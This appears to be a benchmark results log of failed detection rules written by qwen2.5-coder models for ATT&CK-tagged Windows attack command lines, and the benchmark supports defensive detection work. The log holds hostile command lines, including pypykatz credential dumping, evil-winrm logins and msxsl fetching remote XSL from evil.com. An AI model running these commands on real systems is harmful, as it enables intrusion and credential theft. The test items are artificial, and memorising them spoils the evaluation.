# Non-PASS first-try rules

qwen2.5-coder:14b T1053.002 repeat 1: MISSED_SHOWN
Error: missed the shown attack
Shown line: C:\Windows\System32\at.exe 12:00 /interactive cmd.exe
Variant: C:\Windows\System32\at.exe 23:15 /interactive cmd.exe
Detection:
selection:
  Image|endswith: \at.exe
  CommandLine|contains|all:
  - ' /interactive '
  - ' cmd.exe '
condition: selection

qwen2.5-coder:14b T1053.002 repeat 2: MISSED_SHOWN
Error: missed the shown attack
Shown line: C:\Windows\System32\at.exe 12:00 /interactive cmd.exe
Variant: C:\Windows\System32\at.exe 23:15 /interactive cmd.exe
Detection:
selection:
  Image|endswith: \at.exe
  CommandLine|contains|all:
  - ' /interactive '
  - ' cmd.exe '
condition: selection

qwen2.5-coder:14b T1053.002 repeat 3: MISSED_SHOWN
Error: missed the shown attack
Shown line: C:\Windows\System32\at.exe 12:00 /interactive cmd.exe
Variant: C:\Windows\System32\at.exe 23:15 /interactive cmd.exe
Detection:
selection:
  Image|endswith: \at.exe
  CommandLine|contains|all:
  - ' /interactive '
  - ' cmd.exe '
condition: selection

qwen2.5-coder:14b T1082 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"
Variant: C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w
Detection:
selection:
  Image|endswith: \dtrace.exe
  CommandLine|contains|all:
  - ' -w '
  - ' -n "BEGIN { lkd(0); }"'
condition: selection

qwen2.5-coder:14b T1082 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"
Variant: C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w
Detection:
selection:
  Image|endswith: \dtrace.exe
  CommandLine|contains|all:
  - ' -w '
  - ' -n "BEGIN { lkd(0); }"'
condition: selection

qwen2.5-coder:14b T1082 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"
Variant: C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w
Detection:
selection:
  Image|endswith: \dtrace.exe
  CommandLine|contains|all:
  - ' -w '
  - ' -n "BEGIN { lkd(0); }"'
condition: selection

qwen2.5-coder:14b T1202 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt
Variant: C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt
Detection:
selection:
  Image|endswith: \Runscripthelper.exe
  CommandLine|contains|all:
  - surfacecheck
  - C:\temp\payload.txt
condition: selection

qwen2.5-coder:14b T1202 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt
Variant: C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt
Detection:
selection:
  Image|endswith: \Runscripthelper.exe
  CommandLine|contains|all:
  - surfacecheck
  - C:\temp\payload.txt
condition: selection

qwen2.5-coder:14b T1202 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt
Variant: C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt
Detection:
selection:
  Image|endswith: \Runscripthelper.exe
  CommandLine|contains|all:
  - surfacecheck
  - C:\temp\payload.txt
condition: selection

qwen2.5-coder:14b T1529 repeat 1: MISSED_SHOWN
Error: missed the shown attack
Shown line: C:\Windows\System32\shutdown.exe /r /t 0
Variant: C:\Windows\System32\shutdown.exe /r /t 30
Detection:
selection:
  Image|endswith: \shutdown.exe
  CommandLine|contains|all:
  - ' /r '
  - ' /t 0 '
condition: selection

qwen2.5-coder:14b T1529 repeat 2: MISSED_SHOWN
Error: missed the shown attack
Shown line: C:\Windows\System32\shutdown.exe /r /t 0
Variant: C:\Windows\System32\shutdown.exe /r /t 30
Detection:
selection:
  Image|endswith: \shutdown.exe
  CommandLine|contains|all:
  - ' /r '
  - ' /t 0 '
condition: selection

qwen2.5-coder:14b T1529 repeat 3: MISSED_SHOWN
Error: missed the shown attack
Shown line: C:\Windows\System32\shutdown.exe /r /t 0
Variant: C:\Windows\System32\shutdown.exe /r /t 30
Detection:
selection:
  Image|endswith: \shutdown.exe
  CommandLine|contains|all:
  - ' /r '
  - ' /t 0 '
condition: selection

qwen2.5-coder:14b T1615 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\gpresult.exe /z /user admin
Variant: C:\Windows\System32\gpresult.exe /user admin /z
Detection:
selection:
  Image|endswith: \gpresult.exe
  CommandLine|contains|all:
  - ' /z '
  - ' /user '
condition: selection

qwen2.5-coder:7b T1003.002 repeat 1: MISSED_SHOWN
Error: missed the shown attack
Shown line: C:\tools\pypykatz.exe live registry
Variant: D:\ops\pypykatz.exe live registry
Detection:
selection:
  Image|endswith: \pypykatz.exe
  CommandLine|contains: ' live registry '
condition: selection

qwen2.5-coder:7b T1003.002 repeat 2: MISSED_SHOWN
Error: missed the shown attack
Shown line: C:\tools\pypykatz.exe live registry
Variant: D:\ops\pypykatz.exe live registry
Detection:
selection:
  Image|endswith: \pypykatz.exe
  CommandLine|contains: ' live registry '
condition: selection

qwen2.5-coder:7b T1003.002 repeat 3: MISSED_SHOWN
Error: missed the shown attack
Shown line: C:\tools\pypykatz.exe live registry
Variant: D:\ops\pypykatz.exe live registry
Detection:
selection:
  Image|endswith: \pypykatz.exe
  CommandLine|contains: ' live registry '
condition: selection

qwen2.5-coder:7b T1021.006 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Ruby30-x64\bin\ruby.exe evil-winrm.rb -i 10.0.0.1 -u admin -p Password123
Variant: C:\Ruby30-x64\bin\ruby.exe evil-winrm.rb -u admin -p Password123 -i 10.0.0.1
Detection:
selection:
  Image|endswith: \ruby.exe
  CommandLine|contains: ' evil-winrm.rb -i '
condition: selection

qwen2.5-coder:7b T1021.006 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Ruby30-x64\bin\ruby.exe evil-winrm.rb -i 10.0.0.1 -u admin -p Password123
Variant: C:\Ruby30-x64\bin\ruby.exe evil-winrm.rb -u admin -p Password123 -i 10.0.0.1
Detection:
selection:
  Image|endswith: \ruby.exe
  CommandLine|contains: ' evil-winrm.rb -i '
condition: selection

qwen2.5-coder:7b T1082 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"
Variant: C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w
Detection:
selection:
  Image|endswith: \dtrace.exe
  CommandLine|contains: ' -w -n "BEGIN { lkd(0); }"'
condition: selection

qwen2.5-coder:7b T1082 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"
Variant: C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w
Detection:
selection:
  Image|endswith: \dtrace.exe
  CommandLine|contains: ' -w -n "BEGIN { lkd(0); }"'
condition: selection

qwen2.5-coder:7b T1082 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"
Variant: C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w
Detection:
selection:
  Image|endswith: \dtrace.exe
  CommandLine|contains: ' -w -n "BEGIN { lkd(0); }"'
condition: selection

qwen2.5-coder:7b T1113 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\Psr.exe /start /output C:\temp\screen.zip
Variant: C:\Windows\System32\Psr.exe /output C:\temp\screen.zip /start
Detection:
selection:
  Image|endswith: \Psr.exe
  CommandLine|contains: ' /start /output '
condition: selection

qwen2.5-coder:7b T1113 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\Psr.exe /start /output C:\temp\screen.zip
Variant: C:\Windows\System32\Psr.exe /output C:\temp\screen.zip /start
Detection:
selection:
  Image|endswith: \Psr.exe
  CommandLine|contains: ' /start /output '
condition: selection

qwen2.5-coder:7b T1113 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\Psr.exe /start /output C:\temp\screen.zip
Variant: C:\Windows\System32\Psr.exe /output C:\temp\screen.zip /start
Detection:
selection:
  Image|endswith: \Psr.exe
  CommandLine|contains: ' /start /output '
condition: selection

qwen2.5-coder:7b T1202 repeat 1: SYNTAX_ERROR
Error: while parsing a block mapping
  in "<unicode string>", line 8, column 9:
            Image|endswith: '\Runscripthelpe ... 
            ^
expected <blo
Shown line: C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt
Variant: C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt
Detection:
{}

qwen2.5-coder:7b T1202 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt
Variant: C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt
Detection:
selection:
  Image|endswith: \Runscripthelper.exe
  CommandLine|contains|all:
  - surfacecheck
  - C:\\temp\\payload.txt
condition: selection

qwen2.5-coder:7b T1202 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt
Variant: C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt
Detection:
selection:
  Image|endswith: \Runscripthelper.exe
  CommandLine|contains|all:
  - surfacecheck
  - C:\\temp\\payload.txt
condition: selection

qwen2.5-coder:7b T1220 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\msxsl.exe C:\temp\data.xml http://evil.com/sheet.xsl
Variant: C:\Windows\msxsl.exe C:\temp\data.xml http://attacker.org/transform.xsl
Detection:
selection:
  Image|endswith: \msxsl.exe
  CommandLine|contains|all:
  - C:\\temp\\data.xml
  - http://evil.com/sheet.xsl
condition: selection

qwen2.5-coder:7b T1220 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\msxsl.exe C:\temp\data.xml http://evil.com/sheet.xsl
Variant: C:\Windows\msxsl.exe C:\temp\data.xml http://attacker.org/transform.xsl
Detection:
selection:
  Image|endswith: \msxsl.exe
  CommandLine|contains|all:
  - C:\temp\data.xml
  - http://evil.com/sheet.xsl
condition: selection

qwen2.5-coder:7b T1529 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\shutdown.exe /r /t 0
Variant: C:\Windows\System32\shutdown.exe /r /t 30
Detection:
selection:
  Image|endswith: \shutdown.exe
  CommandLine|contains: ' /r /t 0'
condition: selection

qwen2.5-coder:7b T1529 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\shutdown.exe /r /t 0
Variant: C:\Windows\System32\shutdown.exe /r /t 30
Detection:
selection:
  Image|endswith: \shutdown.exe
  CommandLine|contains: ' /r /t 0'
condition: selection

qwen2.5-coder:7b T1529 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\shutdown.exe /r /t 0
Variant: C:\Windows\System32\shutdown.exe /r /t 30
Detection:
selection:
  Image|endswith: \shutdown.exe
  CommandLine|contains: ' /r /t 0'
condition: selection

qwen2.5-coder:7b T1564.004 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\spool\tools\PrintBrm.exe -b -f C:\temp\backup.zip
Variant: C:\Windows\System32\spool\tools\PrintBrm.exe -f C:\temp\backup.zip -b
Detection:
selection:
  Image|endswith: \PrintBrm.exe
  CommandLine|contains: ' -b -f '
condition: selection

qwen2.5-coder:7b T1564.004 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\spool\tools\PrintBrm.exe -b -f C:\temp\backup.zip
Variant: C:\Windows\System32\spool\tools\PrintBrm.exe -f C:\temp\backup.zip -b
Detection:
selection:
  Image|endswith: \PrintBrm.exe
  CommandLine|contains: ' -b -f '
condition: selection

qwen2.5-coder:7b T1564.004 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\spool\tools\PrintBrm.exe -b -f C:\temp\backup.zip
Variant: C:\Windows\System32\spool\tools\PrintBrm.exe -f C:\temp\backup.zip -b
Detection:
selection:
  Image|endswith: \PrintBrm.exe
  CommandLine|contains: ' -b -f '
condition: selection

qwen2.5-coder:7b T1615 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\gpresult.exe /z /user admin
Variant: C:\Windows\System32\gpresult.exe /user admin /z
Detection:
selection:
  Image|endswith: \gpresult.exe
  CommandLine|contains: ' /z /user '
condition: selection

qwen2.5-coder:7b T1615 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\gpresult.exe /z /user admin
Variant: C:\Windows\System32\gpresult.exe /user admin /z
Detection:
selection:
  Image|endswith: \gpresult.exe
  CommandLine|contains: ' /z /user '
condition: selection

qwen2.5-coder:7b T1615 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\gpresult.exe /z /user admin
Variant: C:\Windows\System32\gpresult.exe /user admin /z
Detection:
selection:
  Image|endswith: \gpresult.exe
  CommandLine|contains: ' /z /user '
condition: selection

